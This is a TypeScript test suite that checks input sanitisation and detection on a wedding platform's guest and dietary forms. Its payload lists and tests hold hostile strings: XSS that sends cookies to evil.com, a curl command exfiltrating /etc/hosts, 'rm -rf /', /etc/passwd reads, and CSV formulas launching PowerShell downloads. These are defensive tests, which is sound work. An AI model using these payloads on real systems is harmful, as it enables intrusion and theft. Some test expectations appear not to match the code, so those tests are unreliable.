/**
 * WS-254 Team E: Input Validation and XSS Prevention Testing
 * CRITICAL: Wedding industry platforms handle sensitive guest data - must prevent all injection attacks
 * Dietary management forms are high-risk attack vectors for malicious input
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { DietaryAnalysisService } from '@/lib/dietary-management/dietary-analysis-service';
import { GuestManagementService } from '@/lib/dietary-management/guest-management-service';

// Input Validation and XSS Prevention Testing Framework
class InputValidationTestFramework {
  private maliciousPayloads: {
    xss: string[];
    sqlInjection: string[];
    scriptInjection: string[];
    htmlInjection: string[];
    commandInjection: string[];
    pathTraversal: string[];
    xmlInjection: string[];
    jsonInjection: string[];
    csvInjection: string[];
  };

  private validationRules: {
    guestName: RegExp;
    email: RegExp;
    phone: RegExp;
    dietaryNotes: RegExp;
    medicalInfo: RegExp;
    emergencyContact: RegExp;
  };

  constructor() {
    // Comprehensive malicious payload library for wedding industry testing
    this.maliciousPayloads = {
      xss: [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<svg onload="alert(1)">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload="alert(\'XSS\')">',
        '<div onclick="alert(\'XSS\')">Click me</div>',
        '<input onfocus="alert(\'XSS\')" autofocus>',
        '"><script>alert("XSS")</script>',
        '\'; alert("XSS"); //',
        '<script>document.location="http://evil.com/steal?cookies="+document.cookie</script>',
        '<img src="x" onerror="fetch(\'http://evil.com/steal\',{method:\'POST\',body:document.cookie})" />',
        // Wedding-specific XSS attempts
        'Guest Name<script>alert("Hack wedding data")</script>',
        'Vegan<img src=x onerror="alert(\'Steal dietary info\')" />',
        'Nut allergy"; alert("Medical data breach"); "',
      ],
      sqlInjection: [
        "' OR '1'='1",
        "'; DROP TABLE guests; --",
        "' UNION SELECT * FROM users --",
        "1' AND 1=1 --",
        "admin'--",
        "' OR 1=1#",
        "'; INSERT INTO guests VALUES ('hacker', 'evil@hack.com'); --",
        "' OR EXISTS(SELECT * FROM dietary_requirements WHERE allergy='nut') --",
        // Wedding industry specific SQL injection attempts
        "'; UPDATE wedding_guests SET dietary_restrictions='HACKED'; --",
        "' OR guest_id IN (SELECT guest_id FROM payment_info) --",
        "John Doe'; DELETE FROM dietary_analysis WHERE wedding_date > '2024-01-01'; --",
      ],
      scriptInjection: [
        'eval("alert(1)")',
        'Function("alert(1)")()',
        'setTimeout("alert(1)", 0)',
        'setInterval("alert(1)", 0)',
        'new Function("alert(1)")()',
        'constructor.constructor("alert(1)")()',
        // Node.js specific injections
        'require("child_process").exec("rm -rf /")',
        'process.exit(1)',
        'global.process.mainModule.require("fs").readFileSync("/etc/passwd")',
      ],
      htmlInjection: [
        '<h1>Malicious Header</h1>',
        '<form action="http://evil.com"><input type="password"></form>',
        '<meta http-equiv="refresh" content="0; url=http://evil.com">',
        '<link rel="stylesheet" href="http://evil.com/malicious.css">',
        '<style>body { background-image: url("http://evil.com/track.gif"); }</style>',
        '<!--[if IE]><script src="http://evil.com/ie.js"></script><![endif]-->',
      ],
      commandInjection: [
        '; cat /etc/passwd',
        '| whoami',
        '& netstat -an',
        '$(id)',
        '`ps aux`',
        '; rm -rf /',
        '|| echo "hacked"',
        '; curl http://evil.com/exfiltrate?data=`cat /etc/hosts`',
      ],
      pathTraversal: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '/var/www/../../../etc/passwd',
        'file:///etc/passwd',
        '\\..\\..\\..\\etc\\passwd',
      ],
      xmlInjection: [
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
        '<![CDATA[<script>alert("XSS")</script>]]>',
      ],
      jsonInjection: [
        '{"test": "value", "__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '{"test": "\u0000"}',
        '{"test": "\\u0000"}',
      ],
      csvInjection: [
        '=1+2+cmd|"/C calc"!A0',
        '@SUM(1+1)*cmd|"/C calc"!A0',
        '+SUM(1+1)*cmd|"/C calc"!A0',
        '-SUM(1+1)*cmd|"/C calc"!A0',
        '=1+1+cmd|"/C powershell IEX(wget 0r.pe/p)"',
        // Wedding-specific CSV injection
        '=HYPERLINK("http://evil.com/steal?data="&A1,"Click for guest details")',
      ],
    };

    // Strict validation rules for wedding industry data
    this.validationRules = {
      guestName: /^[a-zA-Z\s\-\.\']{1,100}$/,
      email: /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/,
      phone: /^\+?[\d\s\-\(\)\.]{10,20}$/,
      dietaryNotes: /^[a-zA-Z0-9\s\-\.\,\;\:\!\?\'\"]{1,1000}$/,
      medicalInfo: /^[a-zA-Z0-9\s\-\.\,\;\:\!\?\'\"]{1,500}$/,
      emergencyContact: /^[a-zA-Z\s\-\.\']{1,100}$/,
    };
  }

  // Comprehensive input sanitization
  sanitizeInput(
    input: string,
    type: 'html' | 'sql' | 'javascript' | 'csv' | 'xml',
  ): {
    sanitized: string;
    blocked: boolean;
    threats: string[];
  } {
    const threats: string[] = [];
    let sanitized = input;
    let blocked = false;

    switch (type) {
      case 'html':
        // Block all HTML tags and potentially dangerous characters
        if (/<[^>]*>/g.test(input)) {
          threats.push('HTML tags detected');
          blocked = true;
        }
        if (/javascript:/i.test(input)) {
          threats.push('Javascript protocol detected');
          blocked = true;
        }
        if (/on\w+\s*=/i.test(input)) {
          threats.push('Event handler attributes detected');
          blocked = true;
        }
        sanitized = input
          .replace(/<[^>]*>/g, '')
          .replace(/javascript:/gi, '')
          .replace(/on\w+\s*=/gi, '');
        break;

      case 'sql':
        // Detect SQL injection patterns
        const sqlPatterns = [
          /('|(\\)|;|--|\/\*|\*\/|xp_|sp_|union|select|insert|delete|update|create|alter|drop|exec|execute)/i,
        ];
        sqlPatterns.forEach((pattern) => {
          if (pattern.test(input)) {
            threats.push('SQL injection pattern detected');
            blocked = true;
          }
        });
        // Escape single quotes and remove dangerous SQL keywords
        sanitized = input.replace(/'/g, "''").replace(/(;|--|\/\*|\*\/)/g, '');
        break;

      case 'javascript':
        // Block JavaScript execution attempts
        const jsPatterns = [
          /eval\s*\(/i,
          /function\s*\(/i,
          /settimeout\s*\(/i,
          /setinterval\s*\(/i,
          /require\s*\(/i,
          /process\./i,
          /global\./i,
          /constructor/i,
        ];
        jsPatterns.forEach((pattern) => {
          if (pattern.test(input)) {
            threats.push('JavaScript execution pattern detected');
            blocked = true;
          }
        });
        sanitized = input
          .replace(/[(){}[\]]/g, '')
          .replace(/eval|function|require|process|global/gi, '');
        break;

      case 'csv':
        // Block CSV formula injection
        if (/^[=+\-@]/.test(input.trim())) {
          threats.push('CSV formula injection detected');
          blocked = true;
          sanitized = "'" + input; // Prefix with single quote to treat as text
        }
        break;

      case 'xml':
        // Block XML external entity injection
        if (/<!DOCTYPE|<!ENTITY|SYSTEM|PUBLIC/i.test(input)) {
          threats.push('XML external entity detected');
          blocked = true;
        }
        sanitized = input
          .replace(/<!DOCTYPE[^>]*>/gi, '')
          .replace(/<!ENTITY[^>]*>/gi, '');
        break;
    }

    return { sanitized, blocked, threats };
  }

  // Validate input against wedding industry requirements
  validateWeddingData(data: {
    type:
      | 'guestName'
      | 'email'
      | 'phone'
      | 'dietaryNotes'
      | 'medicalInfo'
      | 'emergencyContact';
    value: string;
  }): {
    valid: boolean;
    errors: string[];
    sanitized: string;
  } {
    const errors: string[] = [];
    const rule = this.validationRules[data.type];

    // Length validation
    if (data.value.length === 0) {
      errors.push(`${data.type} cannot be empty`);
    }

    // Pattern validation
    if (!rule.test(data.value)) {
      errors.push(`${data.type} contains invalid characters or format`);
    }

    // Security validation
    const htmlCheck = this.sanitizeInput(data.value, 'html');
    const sqlCheck = this.sanitizeInput(data.value, 'sql');
    const jsCheck = this.sanitizeInput(data.value, 'javascript');

    if (htmlCheck.blocked) errors.push(...htmlCheck.threats);
    if (sqlCheck.blocked) errors.push(...sqlCheck.threats);
    if (jsCheck.blocked) errors.push(...jsCheck.threats);

    return {
      valid: errors.length === 0,
      errors,
      sanitized: data.value.trim(),
    };
  }

  // Test bulk guest import security (CSV injection prevention)
  validateBulkImport(csvData: string): {
    safe: boolean;
    issues: Array<{
      row: number;
      column: string;
      threat: string;
      value: string;
    }>;
    sanitizedData: string;
  } {
    const issues: Array<{
      row: number;
      column: string;
      threat: string;
      value: string;
    }> = [];

    const rows = csvData.split('\n');
    const sanitizedRows: string[] = [];

    rows.forEach((row, rowIndex) => {
      const columns = row.split(',');
      const sanitizedColumns: string[] = [];

      columns.forEach((column, colIndex) => {
        const trimmed = column.trim().replace(/"/g, '');
        const csvCheck = this.sanitizeInput(trimmed, 'csv');

        if (csvCheck.blocked) {
          issues.push({
            row: rowIndex + 1,
            column: `Column ${colIndex + 1}`,
            threat: csvCheck.threats.join(', '),
            value: trimmed,
          });
        }

        sanitizedColumns.push(`"${csvCheck.sanitized}"`);
      });

      sanitizedRows.push(sanitizedColumns.join(','));
    });

    return {
      safe: issues.length === 0,
      issues,
      sanitizedData: sanitizedRows.join('\n'),
    };
  }

  // Real-time input monitoring for wedding forms
  monitorFormInput(formData: Record<string, any>): {
    blocked: boolean;
    threats: Array<{
      field: string;
      threat: string;
      severity: 'low' | 'medium' | 'high' | 'critical';
      blocked: boolean;
    }>;
    sanitizedData: Record<string, any>;
  } {
    const threats: Array<{
      field: string;
      threat: string;
      severity: 'low' | 'medium' | 'high' | 'critical';
      blocked: boolean;
    }> = [];

    const sanitizedData: Record<string, any> = {};

    Object.entries(formData).forEach(([field, value]) => {
      if (typeof value === 'string') {
        // Check for XSS attempts
        this.maliciousPayloads.xss.forEach((payload) => {
          if (value.includes(payload)) {
            threats.push({
              field,
              threat: `XSS attempt detected: ${payload.substring(0, 50)}...`,
              severity: 'critical',
              blocked: true,
            });
          }
        });

        // Check for SQL injection
        this.maliciousPayloads.sqlInjection.forEach((payload) => {
          if (value.includes(payload)) {
            threats.push({
              field,
              threat: `SQL injection attempt: ${payload.substring(0, 50)}...`,
              severity: 'critical',
              blocked: true,
            });
          }
        });

        // Check for script injection
        this.maliciousPayloads.scriptInjection.forEach((payload) => {
          if (value.includes(payload)) {
            threats.push({
              field,
              threat: `Script injection attempt: ${payload.substring(0, 50)}...`,
              severity: 'high',
              blocked: true,
            });
          }
        });

        // Apply appropriate sanitization based on field type
        const sanitizationType = this.getFieldSanitizationType(field);
        const sanitized = this.sanitizeInput(value, sanitizationType);
        sanitizedData[field] = sanitized.sanitized;
      } else {
        sanitizedData[field] = value;
      }
    });

    const blocked = threats.some((threat) => threat.blocked);

    return { blocked, threats, sanitizedData };
  }

  private getFieldSanitizationType(
    fieldName: string,
  ): 'html' | 'sql' | 'javascript' | 'csv' | 'xml' {
    if (fieldName.includes('note') || fieldName.includes('description')) {
      return 'html';
    }
    if (fieldName.includes('query') || fieldName.includes('search')) {
      return 'sql';
    }
    return 'html'; // Default to HTML sanitization
  }

  // Generate security test report
  generateSecurityReport(testResults: any[]): {
    summary: {
      totalTests: number;
      passed: number;
      failed: number;
      criticalIssues: number;
    };
    recommendations: string[];
    riskLevel: 'low' | 'medium' | 'high' | 'critical';
  } {
    const totalTests = testResults.length;
    const passed = testResults.filter((r) => r.passed).length;
    const failed = totalTests - passed;
    const criticalIssues = testResults.filter(
      (r) => r.severity === 'critical',
    ).length;

    const recommendations: string[] = [];

    if (failed > 0) {
      recommendations.push(
        'Implement comprehensive input validation on all form fields',
      );
      recommendations.push(
        'Add server-side sanitization in addition to client-side validation',
      );
      recommendations.push(
        'Use parameterized queries to prevent SQL injection',
      );
      recommendations.push('Implement Content Security Policy (CSP) headers');
      recommendations.push('Add rate limiting to prevent automated attacks');
    }

    if (criticalIssues > 0) {
      recommendations.push(
        'URGENT: Address critical security vulnerabilities immediately',
      );
      recommendations.push(
        'Conduct security code review of all input handling',
      );
      recommendations.push('Implement Web Application Firewall (WAF)');
      recommendations.push('Add real-time threat monitoring');
    }

    let riskLevel: 'low' | 'medium' | 'high' | 'critical' = 'low';
    if (criticalIssues > 0) riskLevel = 'critical';
    else if (failed > totalTests * 0.3) riskLevel = 'high';
    else if (failed > totalTests * 0.1) riskLevel = 'medium';

    return {
      summary: { totalTests, passed, failed, criticalIssues },
      recommendations,
      riskLevel,
    };
  }
}

describe('Input Validation and XSS Prevention Testing', () => {
  let validationFramework: InputValidationTestFramework;
  let dietaryService: DietaryAnalysisService;
  let guestService: GuestManagementService;

  const mockValidGuestData = {
    name: 'John Smith',
    email: 'john.smith@example.com',
    phone: '+44-20-7946-0958',
    dietaryNotes: 'Vegetarian, no nuts please',
    medicalInfo: 'No known allergies',
    emergencyContact: 'Jane Smith',
  };

  beforeEach(() => {
    validationFramework = new InputValidationTestFramework();
    dietaryService = new DietaryAnalysisService('test-key');
    guestService = new GuestManagementService();
  });

  describe('XSS Prevention Testing', () => {
    it('should block all XSS attack vectors in guest names', () => {
      const testResults: any[] = [];

      validationFramework['maliciousPayloads'].xss.forEach(
        (xssPayload, index) => {
          const result = validationFramework.validateWeddingData({
            type: 'guestName',
            value: xssPayload,
          });

          testResults.push({
            payload: xssPayload,
            blocked: !result.valid,
            passed: !result.valid,
            severity: 'critical',
          });

          expect(result.valid).toBe(false);
          expect(result.errors.length).toBeGreaterThan(0);
          expect(
            result.errors.some(
              (error) =>
                error.includes('invalid characters') ||
                error.includes('HTML tags') ||
                error.includes('Javascript'),
            ),
          ).toBe(true);
        },
      );

      const securityReport =
        validationFramework.generateSecurityReport(testResults);
      expect(securityReport.summary.passed).toBe(testResults.length);
      expect(securityReport.riskLevel).toBe('low'); // All attacks blocked = low risk
    });

    it('should sanitize HTML content in dietary notes', () => {
      const maliciousNote =
        'Vegetarian diet <script>alert("Steal wedding data")</script> no nuts';

      const htmlSanitized = validationFramework.sanitizeInput(
        maliciousNote,
        'html',
      );

      expect(htmlSanitized.blocked).toBe(true);
      expect(htmlSanitized.threats).toContain('HTML tags detected');
      expect(htmlSanitized.sanitized).not.toContain('<script>');
      expect(htmlSanitized.sanitized).toContain('Vegetarian diet');
      expect(htmlSanitized.sanitized).toContain('no nuts');
    });

    it('should prevent JavaScript execution in form fields', () => {
      const maliciousInputs = [
        'eval("alert(1)")',
        'setTimeout("document.location=\'http://evil.com\'", 0)',
        'new Function("alert(\'hacked\')")()',
        'constructor.constructor("alert(1)")()',
      ];

      maliciousInputs.forEach((input) => {
        const jsSanitized = validationFramework.sanitizeInput(
          input,
          'javascript',
        );

        expect(jsSanitized.blocked).toBe(true);
        expect(jsSanitized.threats).toContain(
          'JavaScript execution pattern detected',
        );
        expect(jsSanitized.sanitized).not.toContain('eval');
        expect(jsSanitized.sanitized).not.toContain('Function');
        expect(jsSanitized.sanitized).not.toContain('setTimeout');
      });
    });

    it('should handle mixed content attacks', () => {
      const mixedAttack =
        'John<script>alert("XSS")</script>"; DROP TABLE guests; --';

      const formData = {
        guestName: mixedAttack,
        email: 'valid@email.com',
        dietaryNotes: 'Normal dietary requirements',
      };

      const monitoringResult = validationFramework.monitorFormInput(formData);

      expect(monitoringResult.blocked).toBe(true);
      expect(monitoringResult.threats.length).toBeGreaterThan(0);

      const xssThreat = monitoringResult.threats.find((t) =>
        t.threat.includes('XSS'),
      );
      const sqlThreat = monitoringResult.threats.find((t) =>
        t.threat.includes('SQL injection'),
      );

      expect(xssThreat).toBeDefined();
      expect(sqlThreat).toBeDefined();
      expect(xssThreat?.severity).toBe('critical');
      expect(sqlThreat?.severity).toBe('critical');
    });
  });

  describe('SQL Injection Prevention Testing', () => {
    it('should block all SQL injection attempts', () => {
      validationFramework['maliciousPayloads'].sqlInjection.forEach(
        (sqlPayload) => {
          const result = validationFramework.sanitizeInput(sqlPayload, 'sql');

          expect(result.blocked).toBe(true);
          expect(result.threats).toContain('SQL injection pattern detected');
          expect(result.sanitized).not.toContain('DROP');
          expect(result.sanitized).not.toContain('DELETE');
          expect(result.sanitized).not.toContain('INSERT');
        },
      );
    });

    it('should safely handle legitimate SQL-like content', () => {
      const legitimateContent = "John O'Connor loves SQL Server databases";

      const result = validationFramework.validateWeddingData({
        type: 'guestName',
        value: legitimateContent,
      });

      // Should be invalid due to SQL-like content in name field
      expect(result.valid).toBe(false);

      // But when properly escaped for notes field
      const sqlSanitized = validationFramework.sanitizeInput(
        legitimateContent,
        'sql',
      );
      expect(sqlSanitized.sanitized).toContain("John O''Connor"); // Properly escaped
    });

    it('should prevent union-based SQL injection in search queries', () => {
      const unionAttack =
        "' UNION SELECT email, password FROM users WHERE '1'='1";

      const result = validationFramework.sanitizeInput(unionAttack, 'sql');

      expect(result.blocked).toBe(true);
      expect(result.threats).toContain('SQL injection pattern detected');
      expect(result.sanitized).not.toContain('UNION');
      expect(result.sanitized).not.toContain('SELECT');
    });
  });

  describe('CSV Injection Prevention (Bulk Import Security)', () => {
    it('should prevent CSV formula injection in guest imports', () => {
      const maliciousCSV = `name,email,dietary_notes
John Doe,john@example.com,Vegetarian
=1+1+cmd|"/C calc"!A0,hacker@evil.com,Malicious formula
Jane Smith,jane@example.com,Vegan
@SUM(1+1)*cmd|"/C powershell.exe"!A0,evil@hack.com,Another attack`;

      const validation = validationFramework.validateBulkImport(maliciousCSV);

      expect(validation.safe).toBe(false);
      expect(validation.issues.length).toBe(2);
      expect(validation.issues[0].threat).toContain('CSV formula injection');
      expect(validation.issues[1].threat).toContain('CSV formula injection');

      // Sanitized data should have formulas prefixed with single quote
      expect(validation.sanitizedData).toContain("'=1+1+cmd");
      expect(validation.sanitizedData).toContain("'@SUM");
    });

    it('should handle legitimate Excel functions in dietary requirements', () => {
      const csvWithLegitimateContent = `name,email,dietary_notes
John Doe,john@example.com,"Needs = 2000 calories per day"
Jane Smith,jane@example.com,"Budget: £50 + service charge"`;

      const validation = validationFramework.validateBulkImport(
        csvWithLegitimateContent,
      );

      // Should be safe since = and + are within quoted context and not at start
      expect(validation.safe).toBe(true);
      expect(validation.issues.length).toBe(0);
    });

    it('should prevent HYPERLINK injection in guest data exports', () => {
      const hyperlinkAttack =
        '=HYPERLINK("http://evil.com/steal?data="&A1,"Click for details")';

      const csvCheck = validationFramework.sanitizeInput(
        hyperlinkAttack,
        'csv',
      );

      expect(csvCheck.blocked).toBe(true);
      expect(csvCheck.threats).toContain('CSV formula injection detected');
      expect(csvCheck.sanitized).toContain("'=HYPERLINK"); // Should be prefixed
    });
  });

  describe('Real-time Form Monitoring', () => {
    it('should monitor wedding guest form inputs in real-time', () => {
      const maliciousFormData = {
        guestName: 'John<script>alert("XSS")</script>',
        email: 'valid@email.com',
        phone: '+44-20-1234567',
        dietaryNotes: "Vegetarian'; DROP TABLE dietary_requirements; --",
        medicalInfo:
          '<img src="x" onerror="fetch(\'http://evil.com/steal\',{method:\'POST\',body:localStorage})" />',
        emergencyContact: 'Jane Doe',
      };

      const monitoring =
        validationFramework.monitorFormInput(maliciousFormData);

      expect(monitoring.blocked).toBe(true);
      expect(monitoring.threats.length).toBeGreaterThan(2);

      const criticalThreats = monitoring.threats.filter(
        (t) => t.severity === 'critical',
      );
      expect(criticalThreats.length).toBeGreaterThanOrEqual(2);

      // Sanitized data should be safe
      expect(monitoring.sanitizedData.guestName).not.toContain('<script>');
      expect(monitoring.sanitizedData.dietaryNotes).not.toContain('DROP TABLE');
      expect(monitoring.sanitizedData.medicalInfo).not.toContain('<img');
    });

    it('should allow legitimate wedding guest data', () => {
      const monitoring =
        validationFramework.monitorFormInput(mockValidGuestData);

      expect(monitoring.blocked).toBe(false);
      expect(monitoring.threats.length).toBe(0);
      expect(monitoring.sanitizedData).toEqual(mockValidGuestData);
    });

    it('should handle edge cases in dietary requirements', () => {
      const edgeCaseData = {
        guestName: "Mary O'Connor-Smith",
        email: 'mary.oconnor@example.co.uk',
        dietaryNotes:
          'Allergic to nuts (severe reaction); please use separate cooking utensils & surfaces',
        medicalInfo:
          'Carries EpiPen; emergency contact: Dr. Smith (020-7946-0123)',
      };

      const monitoring = validationFramework.monitorFormInput(edgeCaseData);

      expect(monitoring.blocked).toBe(false);
      expect(monitoring.threats.length).toBe(0);

      // Should preserve legitimate apostrophes and medical information
      expect(monitoring.sanitizedData.guestName).toContain("O'Connor");
      expect(monitoring.sanitizedData.medicalInfo).toContain('Dr. Smith');
    });
  });

  describe('Wedding Industry Specific Security Tests', () => {
    it('should protect guest privacy during venue data sharing', () => {
      const venueDataExport = {
        guestName: 'John Doe',
        dietaryRestrictions:
          '<script>window.location="http://competitor.com/steal-guest-data"</script>Vegetarian',
        tableNumber: '=HYPERLINK("http://evil.com","Table 5")',
        specialRequests: 'Normal requirements',
      };

      const monitoring = validationFramework.monitorFormInput(venueDataExport);

      expect(monitoring.blocked).toBe(true);

      const xssThreat = monitoring.threats.find((t) =>
        t.threat.includes('XSS'),
      );
      expect(xssThreat).toBeDefined();
      expect(xssThreat?.field).toBe('dietaryRestrictions');
      expect(xssThreat?.severity).toBe('critical');
    });

    it('should validate emergency contact information securely', () => {
      const emergencyData = {
        emergencyName: 'Dr. Jane Smith',
        emergencyPhone: '+44-20-7946-0958',
        relationship: 'Family Doctor',
        medicalNotes:
          'Contact immediately for nut allergies"; alert("Medical data breach"); "',
      };

      const monitoring = validationFramework.monitorFormInput(emergencyData);

      expect(monitoring.blocked).toBe(true);

      const sqlThreat = monitoring.threats.find((t) =>
        t.threat.includes('SQL injection'),
      );
      expect(sqlThreat).toBeDefined();
      expect(sqlThreat?.field).toBe('medicalNotes');
    });

    it('should secure catering integration data exports', () => {
      const cateringExportData = `guest_name,dietary_restrictions,allergies
John Doe,Vegetarian,"No nuts"
=cmd|"/C powershell IEX(wget evil.com/steal)"|"",Hacker,Evil
Jane Smith,Vegan,"Dairy free"`;

      const validation =
        validationFramework.validateBulkImport(cateringExportData);

      expect(validation.safe).toBe(false);
      expect(
        validation.issues.some(
          (issue) =>
            issue.threat.includes('CSV formula injection') &&
            issue.value.includes('powershell'),
        ),
      ).toBe(true);
    });

    it('should handle multilingual guest names securely', () => {
      const internationalGuests = {
        guestName1: 'José María González',
        guestName2: '张小明', // Chinese name
        guestName3: 'مريم النجار', // Arabic name
        guestName4: 'Αλέξανδρος Παπαδόπουλος', // Greek name
        maliciousName: 'José<script>alert("International XSS")</script>María',
      };

      const monitoring =
        validationFramework.monitorFormInput(internationalGuests);

      // Should block malicious content but allow legitimate international characters
      expect(monitoring.blocked).toBe(true);
      expect(monitoring.threats.length).toBe(1);
      expect(monitoring.threats[0].field).toBe('maliciousName');

      // Legitimate international names should be preserved
      expect(monitoring.sanitizedData.guestName1).toBe('José María González');
      expect(monitoring.sanitizedData.guestName2).toBe('张小明');
      expect(monitoring.sanitizedData.guestName3).toBe('مريم النجار');
    });
  });

  describe('Performance Impact of Security Measures', () => {
    it('should process security validation quickly for wedding day performance', async () => {
      const startTime = Date.now();

      // Test with 1000 guest records to simulate wedding day load
      const guestPromises = Array.from({ length: 1000 }, (_, i) => {
        const guestData = {
          ...mockValidGuestData,
          name: `Guest ${i}`,
          email: `guest${i}@wedding.com`,
        };

        return validationFramework.monitorFormInput(guestData);
      });

      await Promise.all(guestPromises);

      const processingTime = Date.now() - startTime;

      // Should complete within 2 seconds for 1000 guests (wedding day requirement)
      expect(processingTime).toBeLessThan(2000);
      console.log(
        `Security validation for 1000 guests completed in ${processingTime}ms`,
      );
    });

    it('should maintain form responsiveness during security checks', async () => {
      const largeFormData = {
        guestName: 'John Doe',
        email: 'john@example.com',
        dietaryNotes: 'Very detailed dietary requirements '.repeat(50), // Large text input
        medicalInfo: 'Comprehensive medical history '.repeat(30),
        specialRequests: 'Extensive special requests '.repeat(40),
      };

      const startTime = Date.now();
      const monitoring = validationFramework.monitorFormInput(largeFormData);
      const validationTime = Date.now() - startTime;

      // Should complete within 100ms for individual form validation
      expect(validationTime).toBeLessThan(100);
      expect(monitoring.blocked).toBe(false);

      console.log(`Large form validation completed in ${validationTime}ms`);
    });
  });

  describe('Security Testing Report Generation', () => {
    it('should generate comprehensive security assessment report', () => {
      const testResults = [
        { passed: true, severity: 'low' },
        { passed: false, severity: 'critical' },
        { passed: true, severity: 'medium' },
        { passed: false, severity: 'high' },
        { passed: true, severity: 'low' },
      ];

      const report = validationFramework.generateSecurityReport(testResults);

      expect(report.summary.totalTests).toBe(5);
      expect(report.summary.passed).toBe(3);
      expect(report.summary.failed).toBe(2);
      expect(report.summary.criticalIssues).toBe(1);

      expect(report.riskLevel).toBe('critical'); // Due to 1 critical issue
      expect(report.recommendations.length).toBeGreaterThan(0);
      expect(
        report.recommendations.some(
          (rec) => rec.includes('URGENT') || rec.includes('critical'),
        ),
      ).toBe(true);
    });

    it('should provide actionable security recommendations for wedding platforms', () => {
      const failedTestResults = [
        { passed: false, severity: 'critical' },
        { passed: false, severity: 'critical' },
        { passed: false, severity: 'high' },
      ];

      const report =
        validationFramework.generateSecurityReport(failedTestResults);

      expect(report.recommendations).toContain(
        'Implement comprehensive input validation on all form fields',
      );
      expect(report.recommendations).toContain(
        'Use parameterized queries to prevent SQL injection',
      );
      expect(report.recommendations).toContain(
        'Implement Content Security Policy (CSP) headers',
      );
      expect(report.recommendations).toContain(
        'URGENT: Address critical security vulnerabilities immediately',
      );

      expect(report.riskLevel).toBe('critical');
    });
  });
});
